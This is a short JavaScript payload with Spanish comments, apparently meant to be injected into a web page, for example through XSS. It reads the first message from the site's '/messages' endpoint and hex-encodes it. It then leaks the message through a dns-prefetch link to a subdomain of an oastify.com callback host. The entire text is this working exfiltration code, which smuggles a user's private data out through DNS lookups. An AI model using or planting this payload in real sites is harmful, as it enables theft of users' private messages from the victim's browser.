async function obtenerMensaje1Hex() {
  try {
    const res = await fetch('/messages');
    if (!res.ok) throw new Error('Error al obtener los mensajes');

    const data = await res.json();
    const mensaje1 = data.messages.find(msg => msg.id === 1);
    if (!mensaje1) throw new Error('No se encontró el mensaje con id 1');

    const original = mensaje1.message;

    // Convertir a hexadecimal
    const hex = Array.from(original)
      .map(ch => ch.charCodeAt(0).toString(16).padStart(2, '0'))
      .join('');

    // Insertar un "." cada 32 caracteres
    const hexConPuntos = hex.replace(/(.{32})/g, '$1.');

    console.log('Mensaje original:', original);
    console.log('Mensaje en hex con puntos:', hexConPuntos);

    return hexConPuntos;
  } catch (err) {
    console.error('Hubo un problema:', err);
    return null;
  }
}

obtenerMensaje1Hex().then(resultado => {
  if (resultado) {
  prefetchLink = document.createElement('link');
  prefetchLink.rel = 'dns-prefetch';
  prefetchLink.href = '//'+resultado+'.0stjz8e8p6ide1vtjrzm3ah6bxho5mtb.oastify.com';
  
  // Insertarlo en el <head>
  document.head.appendChild(prefetchLink);
  }
});
